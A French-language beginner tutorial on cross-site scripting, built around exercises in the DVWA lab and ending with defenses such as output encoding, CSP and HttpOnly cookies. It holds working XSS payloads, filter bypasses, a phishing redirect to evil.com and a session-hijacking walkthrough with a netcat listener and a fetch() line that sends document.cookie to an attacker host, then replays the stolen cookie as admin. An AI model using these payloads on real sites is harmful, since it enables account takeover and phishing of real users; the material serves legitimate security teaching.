# Cours : XSS (Cross-Site Scripting) - Guide du Débutant pour l'Exploitation Basique et Pédagogique

## Partie 1 : Comprendre XSS - Les Fondamentaux

### 1.1 Qu'est-ce que XSS ? (Explication simple)

Imaginez que vous visitiez un site web. Normalement, ce site affiche du contenu que le propriétaire a créé. Mais s'il y a une vulnérabilité XSS, un attaquant peut **injecter du code JavaScript** qui s'exécutera dans votre navigateur lorsque vous visiterez la page.

🔑 **Point clé** : XSS signifie "**Cross-Site Scripting**" = Script d'un site qui s'exécute sur un autre site.

---

### 1.2 Pourquoi XSS est dangereux ?

Lorsqu'un code JavaScript malveillant s'exécute dans votre navigateur, il peut :

| ⚠️ Danger | Explication simple |
|-----------|-------------------|
| **Vol de cookies** | Le JavaScript peut lire vos cookies de connexion |
| **Keylogging** | Enregistrer tout ce que vous tapez au clavier |
| **Phishing** | Rediriger vers une fausse page de connexion |
| **Defacement** | Modifier l'apparence de la page |
| **Propagation** | Télécharger des malwares automatiquement |

---

### 1.3 Les 3 types de XSS - Tableau comparatif

| Type | Comment ça marche | Persistance | Dangerosité |
|------|------------------|-------------|-------------|
| **DOM-based** | Le code manipule directement la page dans le navigateur | ❌ Non persistant | 🟡 Moyen |
| **Reflected** | L'attaque est dans l'URL et renvoyée par le serveur | ❌ Non persistant | 🟡 Moyen |
| **Stored** | L'attaque est stockée dans la base de données | ✅ Persistant | 🔴 **Très dangereux** |

---

### 1.4 Analogie pour comprendre les types

🎯 **Analogie d'un tableau d'affichage** :

- **DOM-based** : Vous écrivez un message sur un post-it et le collez vous-même sur le tableau.
- **Reflected** : Vous donnez un message à quelqu'un qui le lit à haute voix une fois.
- **Stored** : Vous écrivez un message qui est imprimé et affiché **permanemment** sur le tableau pour tout le monde.

---

## Partie 2 : Mise en place de l'environnement

### 2.1 Prérequis

Pour suivre ce cours, vous aurez besoin de :

```
✅ DVWA (Damn Vulnerable Web Application) installé
✅ Un navigateur web (Chrome/Firefox)
✅ Accès aux outils de développement (F12)
```

### 2.2 Configuration initiale

1. Ouvrir DVWA dans votre navigateur
2. Se connecter (par défaut : admin/password)
3. Aller dans "DVWA Security"
4. Sélectionner le niveau : **Low** (pour commencer)

---

## Partie 3 : XSS DOM (Document Object Model)

### 3.1 Comprendre le DOM

Le **DOM** est une représentation de la page web sous forme d'arbre. JavaScript peut modifier cet arbre pour changer le contenu affiché.

🔍 **Exemple simple** :
```html
<div id="message">Bonjour</div>
<script>
  document.getElementById('message').innerHTML = 'Au revoir';
</script>
```
→ Le texte "Bonjour" devient "Au revoir"

---

### 3.2 Exercice 1 : Découverte de la vulnérabilité DVWA XSS (DOM)

**Étape 1 : Accéder à la page**

```
DVWA → XSS (DOM)
```

Vous verrez un menu déroulant pour choisir une langue.

---

**Étape 2 : Observer l'URL**

Sélectionnez "French" et cliquez sur "Select". Regardez l'URL :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default=French
```

🔑 **Observation** : Le paramètre `default=French` contrôle la langue affichée.

---

**Étape 3 : Tester une modification manuelle**

Changez l'URL manuellement :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default=Espagnol
```

→ Le menu affichera "Espagnol"

💡 **Conclusion** : Ce que nous mettons dans l'URL s'affiche directement sur la page !

---

### 3.3 Explication du code vulnérable

Voici le code JavaScript qui rend la page vulnérable :

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(
        document.location.href.indexOf("default=") + 8
    );
    
    // ⚠️ PROBLÈME : Injection directe sans vérification !
    document.write("<option value='" + lang + "'>" + lang + "</option>");
}
```

❌ **Le problème** : La valeur de `lang` est directement insérée dans le HTML sans aucune vérification.

---

### 3.4 Exercice 2 : Première exploitation XSS (Alert)

**Objectif** : Faire apparaître une boîte de dialogue "XSS" sur la page.

---

**Étape 1 : Construire le payload**

Nous allons injecter du code HTML qui inclut du JavaScript :

```
<script>alert('XSS')</script>
```

🔑 **Explication** :
- `<script>` : Balise pour exécuter du JavaScript
- `alert('XSS')` : Fonction qui affiche une boîte de dialogue
- `</script>` : Fermeture de la balise script

---

**Étape 2 : Contourner le menu déroulant**

Le payload précédent ne fonctionnera pas directement car il est inséré dans une balise `<option>`. Nous devons d'abord fermer cette balise :

```
'></option></select><script>alert('XSS')</script>
```

🔍 **Décomposition pas à pas** :

| Caractère | Rôle | Explication |
|-----------|------|-------------|
| `'` | Ferme l'attribut | Ferme `value='` |
| `>` | Ferme la balise | Ferme `<option>` |
| `</option>` | Fermeture propre | Ferme complètement `<option>` |
| `</select>` | Fermeture propre | Ferme complètement `<select>` |
| `<script>alert('XSS')</script>` | Code malveillant | Notre payload XSS |

---

**Étape 3 : Injecter le payload**

Construisez l'URL complète :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>alert('XSS')</script>
```

Accédez à cette URL dans votre navigateur.

---

**Étape 4 : Vérifier le résultat**

✅ **Succès !** Une boîte de dialogue avec "XSS" apparaît !

💡 **Ce qui s'est passé** :
1. Le navigateur a chargé la page
2. Le JavaScript vulnérable a lu le paramètre `default`
3. Il a injecté notre payload dans le HTML
4. Le navigateur a exécuté notre `<script>alert('XSS')</script>`

---

### 3.5 Exercice 3 : Redirection malveillante

**Objectif** : Rediriger l'utilisateur vers un autre site.

---

**Payload de redirection** :

```javascript
'></option></select><script>document.location.href="https://google.com"</script>
```

🔑 **Explication** :
- `document.location.href` = L'URL actuelle
- En la modifiant, on redirige l'utilisateur
- Ici, on redirige vers Google

---

**Testez-le** :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>document.location.href="https://google.com"</script>
```

→ La page redirige automatiquement vers Google !

⚠️ **Note** : Dans une attaque réelle, l'attaquant redirigerait vers une fausse page de login pour voler les identifiants.

---

### 3.6 Exercice 4 : Niveau Medium - Bypass de filtre

**Changement de niveau** :

```
DVWA Security → Medium
```

---

**Test du payload précédent** :

```
'></option></select><script>alert('XSS')</script>
```

❌ **Ça ne fonctionne plus !** Le filtre a supprimé `<script`.

---

**Analyse du filtre** :

```php
<?php
$default = $_GET['default'];
$default = str_replace("<script", "", $default); // Supprime "<script"
echo $default;
?>
```

🔍 **Le filtre** : Il cherche exactement `<script` et le supprime.

---

**Bypass : Utiliser une autre balise**

Au lieu de `<script>`, nous pouvons utiliser `<img>` avec un gestionnaire d'erreur :

```
"></option></select><img src=x onerror="alert('XSS')">
```

🔑 **Explication** :
- `<img src=x>` : Image avec une source invalide ("x" n'existe pas)
- `onerror="alert('XSS')"` : Code exécuté quand l'image échoue à charger
- Résultat : L'erreur déclenche notre `alert('XSS')`

---

**Testez-le** :

```
http://servertcm:8001/vulnerabilities/xss_dom/?default="></option></select><img src=x onerror="alert('XSS')">
```

✅ **Succès !** L'alerte apparaît même avec le filtre !

💡 **Leçon** : Les filtres simples sont souvent contournables en utilisant des techniques alternatives.

---

## Partie 4 : XSS Reflected

### 4.1 Comprendre XSS Reflected

🔄 **Flux de l'attaque** :

```
1. Attaquant crée une URL malveillante
2. Attaquant envoie l'URL à la victime (par email, phishing...)
3. Victime clique sur l'URL
4. Serveur renvoie le payload dans la page
5. Navigateur de la victime exécute le JavaScript
```

🔑 **Caractéristique** : L'attaque doit être déclenchée par la victime (elle ne persistera pas).

---

### 4.2 Exercice 5 : Exploitation XSS Reflected (Low)

**Accès à la page** :

```
DVWA → XSS (Reflected)
```

Vous verrez un formulaire : "What's your name?"

---

**Test normal** :

```
Input: John
Output: Hello John
```

L'URL devient :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=John
```

🔑 **Observation** : Le nom est dans le paramètre `name` de l'URL.

---

**Payload XSS** :

```
<script>alert('XSS')</script>
```

Construisez l'URL :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

Accédez à cette URL.

---

**Résultat** :

✅ **Succès !** L'alerte apparaît immédiatement !

💡 **Ce qui s'est passé** :
1. Le serveur a reçu `name=<script>alert('XSS')</script>`
2. Il l'a inséré dans la page HTML
3. Le navigateur a exécuté le script

---

### 4.3 Scénario d'attaque réaliste

Imaginez ce scénario :

```
📧 Email de phishing :

"Cher utilisateur, veuillez vérifier votre compte :
https://banque.com/verifier?name=<script>document.location.href='http://evil.com/fausse-login'</script>

Cordialement,
L'équipe de sécurité"
```

Si la victime clique, elle sera redirigée vers une fausse page de login !

---

### 4.4 Exercice 6 : Niveau Medium - Bypass

**Changement de niveau** :

```
DVWA Security → Medium
```

---

**Test du payload `<script>`** :

```
<script>alert('XSS')</script>
```

❌ **Filtré !** Le `<script` est supprimé.

---

**Bypass avec `<img onerror>`** :

```
<img onerror="alert('XSS')" src=x>
```

Construisez l'URL :

```
http://servertcm:8001/vulnerabilities/xss_r/?name=<img onerror="alert('XSS')" src=x>
```

✅ **Succès !** Le bypass fonctionne aussi ici !

---

## Partie 5 : XSS Stored (Persistent)

### 5.1 Comprendre XSS Stored

🔴 **C'est le type le plus dangereux !**

🔄 **Flux de l'attaque** :

```
1. Attaquant injecte le payload dans un champ (commentaire, message...)
2. Payload est stocké dans la base de données
3. Chaque visiteur de la page exécute le payload
4. Attaquant n'a plus besoin d'intervenir
```

🔑 **Caractéristique** : Une fois injecté, le payload affecte **tous les visiteurs**.

---

### 5.2 Exercice 7 : Découverte de la vulnérabilité

**Accès à la page** :

```
DVWA → XSS (Stored)
```

Vous verrez un formulaire avec :
- Un champ "Name"
- Un champ "Message"
- Un bouton "Sign Guestbook"

---

**Test normal** :

```
Name: Alice
Message: Bonjour tout le monde !
```

→ Le message apparaît dans la liste des messages.

---

### 5.3 Exercice 8 : Contourner la limitation de champ

**Observation du code HTML** (F12 → Inspecteur) :

```html
<input type="text" name="txtName" maxlength="10">
```

⚠️ **Problème** : Le champ "Name" est limité à 10 caractères ! Notre payload `<script>alert('XSS')</script>` fait 25 caractères.

---

**Solution : Modifier le HTML**

1. Faites un clic droit sur le champ "Name"
2. Sélectionnez "Inspecter"
3. Dans le code HTML, trouvez `maxlength="10"`
4. Changez-le en `maxlength="100"` (ou supprimez l'attribut)
5. Appuyez sur Entrée

✅ **Maintenant vous pouvez écrire plus de 10 caractères !**

💡 **Leçon important** : Les limitations côté client (HTML/JavaScript) ne sont pas des sécurités ! Elles peuvent être contournées.

---

### 5.4 Exercice 9 : Injection XSS Stored

**Payload** :

```
Name: <script>alert('XSS')</script>
Message: Ceci est un test
```

Cliquez sur "Sign Guestbook".

---

**Résultat** :

✅ **Succès !** L'alerte apparaît !

🔍 **Observation importante** : Actualisez la page (F5) → L'alerte réapparaît !

💡 **Pourquoi ?** Le payload est stocké dans la base de données et s'exécute à chaque chargement de la page.

---

### 5.5 Exercice 10 : Tester la persistance

**Ouvrez un navigateur en mode privé** :

```
Chrome : Ctrl + Shift + N
Firefox : Ctrl + Shift + P
```

Accédez à DVWA XSS (Stored) sans vous connecter.

---

**Résultat** :

✅ **L'alerte apparaît automatiquement !**

🔴 **Conclusion** : Le XSS Stored affecte **tous les visiteurs**, même ceux qui ne sont pas connectés !

---

## Partie 6 : Session Hijacking (Vol de Session)

### 6.1 Comprendre les sessions

🔑 **Comment fonctionne une connexion web ?**

1. Vous vous connectez avec votre mot de passe
2. Le serveur crée une **session** pour vous
3. Le serveur vous donne un **cookie de session** (ex: `PHPSESSID=abc123`)
4. Votre navigateur envoie ce cookie à chaque requête
5. Le serveur reconnaît le cookie et sait que c'est vous

🍪 **Analogie** : Le cookie de session est comme un "badge d'accès" temporaire.

---

### 6.2 Le danger du vol de cookie

Si un attaquant vole votre cookie de session :

```
😈 Attaquant : "J'ai le cookie PHPSESSID=abc123"
🌐 Serveur : "C'est le badge de l'admin... Bienvenue admin !"
😈 Attaquant : "Je suis connecté en tant qu'admin sans connaître le mot de passe !"
```

🔴 **C'est le Session Hijacking** = Usurpation de session.

---

### 6.3 Exercice 11 : Observer le cookie de session

**Étape 1 : Se connecter à DVWA**

Connectez-vous avec admin/password.

---

**Étape 2 : Ouvrir les outils de développement**

```
F12 → Application (Chrome) ou Stockage (Firefox) → Cookies
```

---

**Étape 3 : Observer les cookies**

Vous verrez quelque chose comme :

| Nom | Valeur | HttpOnly | Secure |
|-----|--------|----------|--------|
| `PHPSESSID` | `abc123def456...` | ❌ Non | ❌ Non |
| `security` | `low` | ❌ Non | ❌ Non |

⚠️ **Point critique** : `HttpOnly = Non` signifie que le cookie est accessible via JavaScript !

---

**Étape 4 : Tester l'accès au cookie**

Ouvrez la console (F12 → Console) et tapez :

```javascript
document.cookie
```

Résultat :

```
PHPSESSID=abc123def456...; security=low
```

✅ **Confirmation** : JavaScript peut lire le cookie !

---

### 6.4 Exercice 12 : Voler le cookie via XSS

**Préparation : Listener Netcat**

Ouvrez un terminal (sur votre machine Kali/Linux) et lancez :

```bash
nc -nvlp 8000
```

🔑 **Explication** :
- `nc` = Netcat, outil de réseau
- `-n` = Pas de résolution DNS
- `-v` = Verbose (affiche les détails)
- `-l` = Mode écoute (listen)
- `-p 8000` = Port 8000

→ Le terminal attend une connexion sur le port 8000.

---

**Injection du payload de vol**

Allez sur DVWA XSS (Stored) et injectez :

```
Name: Hacker
Message: <script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
```

⚠️ **Important** : Remplacez `192.168.1.48` par votre propre adresse IP !

🔑 **Explication du payload** :

| Partie | Rôle |
|--------|------|
| `<script>...</script>` | Balise JavaScript |
| `fetch(...)` | Fonction pour faire une requête HTTP |
| `'http://192.168.1.48:8000/'` | URL de votre machine (attaquant) |
| `+document.cookie` | Le cookie de session est ajouté à l'URL |

---

**Ce qui se passe** :

1. Le navigateur de la victime exécute le JavaScript
2. `document.cookie` lit le cookie (ex: `PHPSESSID=abc123`)
3. `fetch()` envoie une requête vers votre machine
4. Votre reçoit : `GET /PHPSESSID=abc123; security=low`

---

**Résultat dans Netcat** :

```
listening on [any] 8000 ...
connect to [192.168.1.48] from (UNKNOWN) [192.168.1.100] 54321
GET /PHPSESSID=abc123def456...; security=low HTTP/1.1
Host: 192.168.1.48:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

🎯 **Succès !** Vous avez volé le cookie !

---

### 6.5 Exercice 13 : Utiliser le cookie volé (Impersonation)

**Étape 1 : Ouvrir un navigateur en mode privé**

```
Ctrl + Shift + N (Chrome) ou Ctrl + Shift + P (Firefox)
```

Accédez à DVWA : `http://servertcm:8001`

→ Vous verrez la page de login (pas connecté).

---

**Étape 2 : Injecter le cookie volé**

1. F12 → Application → Cookies
2. Cliquez sur le domaine `http://servertcm:8001`
3. Cliquez sur "Ajouter" ou le bouton "+"
4. Remplissez :
   - **Name** : `PHPSESSID`
   - **Value** : `abc123def456...` (le cookie volé)
   - **Domain** : `servertcm`
   - **Path** : `/`
5. Sauvegardez

---

**Étape 3 : Rafraîchir la page**

Supprimez `/login.php` de l'URL et appuyez sur Entrée.

```
http://servertcm:8001/
```

Rafraîchissez (F5).

---

**Résultat** :

```
┌─────────────────────────────────────┐
│  Damn Vulnerable Web Application    │
│                                     │
│  Welcome admin                      │
│  Logout                             │
└─────────────────────────────────────┘
```

🎉 **Succès !** Vous êtes connecté en tant qu'admin **sans mot de passe** !

---

## Partie 7 : Protections contre XSS

### 7.1 Protection 1 : Encodage de sortie (Output Encoding)

🛡️ **Principe** : Convertir les caractères spéciaux en leur version HTML sécurisée.

| Caractère | Version encodée |
|-----------|-----------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

---

**Exemple en PHP** :

```php
<?php
// ❌ Mauvais : Vulnérable à XSS
echo $_GET['name'];

// ✅ Bon : Protégé avec htmlspecialchars()
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

🔑 **Résultat** :
- Input : `<script>alert('XSS')</script>`
- Output : `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;`
- Affichage : `<script>alert('XSS')</script>` (texte, pas exécuté)

---

**Exemple en JavaScript** :

```javascript
// ❌ Mauvais : Vulnérable à XSS
document.getElementById('output').innerHTML = userInput;

// ✅ Bon : Protégé avec textContent
document.getElementById('output').textContent = userInput;
```

---

### 7.2 Protection 2 : Content Security Policy (CSP)

🛡️ **Principe** : Dire au navigateur quelles sources de scripts sont autorisées.

---

**Exemple de header CSP** :

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

🔑 **Signification** :
- `default-src 'self'` : Par défaut, tout doit venir du même domaine
- `script-src 'self'` : Les scripts doivent venir du même domaine uniquement

---

**Effet** :
- ✅ Scripts externes bloqués
- ✅ Scripts inline (`<script>alert('XSS')</script>`) bloqués
- ✅ `eval()` bloqué
- ✅ Event handlers inline (`onerror="..."`) bloqués

---

### 7.3 Protection 3 : HttpOnly Cookie

🛡️ **Principe** : Empêcher JavaScript d'accéder au cookie.

---

**Configuration en PHP** :

```php
<?php
session_start();

// Configurer le cookie avec HttpOnly
session_set_cookie_params([
    'httponly' => true,  // ← Bloque document.cookie
    'secure' => true,    // HTTPS uniquement
    'samesite' => 'Strict'
]);
?>
```

---

**Effet** :

```javascript
document.cookie
// Résultat : "" (vide)
```

🔑 **Résultat** : Même avec XSS, l'attaquant ne peut pas voler le cookie !

---

### 7.4 Protection 4 : Validation côté serveur

🛡️ **Principe** : Vérifier que l'input correspond à ce qui est attendu.

---

**Exemple : Whitelist** (autoriser seulement certains caractères)

```php
<?php
// ❌ Mauvais : Accepte tout
$name = $_GET['name'];

// ✅ Bon : Accepte seulement lettres et chiffres
if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['name'])) {
    die("Nom invalide : seulement lettres et chiffres autorisés");
}
$name = $_GET['name'];
?>
```

---

### 7.5 Résumé des protections

| Protection | Contre quoi | Efficacité |
|------------|-------------|------------|
| **Output Encoding** | Injection de scripts | 🔴 Essentielle |
| **CSP** | Exécution de scripts non autorisés | 🟡 Forte |
| **HttpOnly Cookie** | Vol de cookies via XSS | 🟡 Forte |
| **Validation serveur** | Input malveillant | 🟡 Forte |
| **Filtrage simple** | Tentatives basiques | 🔴 Faible (bypassable) |

---

## Partie 8 : Exercices Pratiques

### Exercice 1 : XSS DOM

🎯 **Objectif** : Faire apparaître une alerte avec votre prénom.

```
Payload : '></option></select><script>alert('VotrePrénom')</script>
```

---

### Exercice 2 : XSS Reflected

🎯 **Objectif** : Créer une URL qui redirige vers un site de votre choix.

```
Payload : <script>document.location.href='https://example.com'</script>
```

---

### Exercice 3 : XSS Stored

🎯 **Objectif** : Injecter un message persistant qui affiche une alerte personnalisée.

```
Payload : <script>alert('Message persistant !')</script>
```

---

### Exercice 4 : Vol de cookie (Simulation)

🎯 **Objectif** : Créer un payload qui envoie le cookie vers un serveur fictif.

```
Payload : <script>fetch('http://serveur-fictif.com/steal?c='+document.cookie);</script>
```

⚠️ **Note** : Ne testez pas ceci sur un vrai serveur sans autorisation !

---

## Partie 9 : Résumé et Points Clés

### 🎓 Ce que vous avez appris

| Concept | Points clés |
|---------|-------------|
| **XSS** | Injection de JavaScript dans une page web |
| **3 types** | DOM-based, Reflected, Stored |
| **DOM XSS** | Manipulation du DOM côté client |
| **Reflected XSS** | Payload dans l'URL, renvoyé par serveur |
| **Stored XSS** | Payload stocké en DB (plus dangereux) |
| **Session Hijacking** | Vol de cookie de session |
| **Protections** | Output encoding, CSP, HttpOnly, validation |

---

### 🔑 Points essentiels à retenir

1. **XSS permet l'exécution de JavaScript dans le navigateur de la victime**
2. **Stored XSS est le plus dangereux car il affecte tous les visiteurs**
3. **Les filtres simples sont souvent contournables**
4. **Le vol de cookie permet de se connecter sans mot de passe**
5. **HttpOnly empêche le vol de cookie via JavaScript**
6. **Output encoding est la protection la plus importante**
7. **Les limitations côté client (HTML) ne sont pas des sécurités**
8. **Toujours tester les filtres avec plusieurs payloads**

---

### 🚀 Pour aller plus loin

- **OWASP XSS Prevention Cheat Sheet** : Guide complet de protection
- **PortSwigger Web Security Academy** : Laboratoires interactifs gratuits
- **DVWA** : Entraînez-vous sur différents niveaux de sécurité

---

## 📝 Glossaire

| Terme | Définition |
|-------|------------|
| **XSS** | Cross-Site Scripting : Injection de scripts malveillants |
| **DOM** | Document Object Model : Représentation de la page web |
| **Payload** | Code malveillant injecté |
| **Session** | Connexion temporaire entre client et serveur |
| **Cookie** | Petit fichier stocké par le navigateur |
| **Session Hijacking** | Vol de session pour usurper une identité |
| **HttpOnly** | Flag de sécurité pour les cookies |
| **CSP** | Content Security Policy : Politique de sécurité |
| **Output Encoding** | Encodage des données avant affichage |
| **Whitelist** | Liste de valeurs autorisées |